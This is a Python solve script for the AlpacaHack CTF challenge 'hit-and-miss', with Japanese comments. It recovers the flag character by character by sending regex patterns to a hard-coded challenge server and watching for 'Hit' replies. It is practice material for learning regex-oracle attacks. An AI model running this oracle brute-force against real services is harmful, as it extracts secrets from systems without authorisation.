"""hit-and-miss

問題url: https://alpacahack.com/challenges/hit-and-miss
"""

import re
import socket
import string

# FIXME: challenge server のをつかう
HOST = "34.170.146.252"
PORT = 18425

flag = "Alpaca{"

# \w で使われる文字の一覧リスト
chars = [c for c in string.printable if re.fullmatch(r"\w", c, flags=re.ASCII)]

with socket.create_connection((HOST, PORT)) as s:
    _ = s.recv(4096)

    while not flag.endswith("}"):
        for ch in chars + ["}"]:
            print(f"flag: {flag}, ch: {ch}")

            next_flag = flag + ch
            pattern = re.escape(next_flag) + "\w*"

            s.sendall(bytes(pattern + "\n", encoding="utf-8"))
            res = s.recv(4096).decode()

            if "Hit" in res:
                flag = next_flag
                break

print(flag)
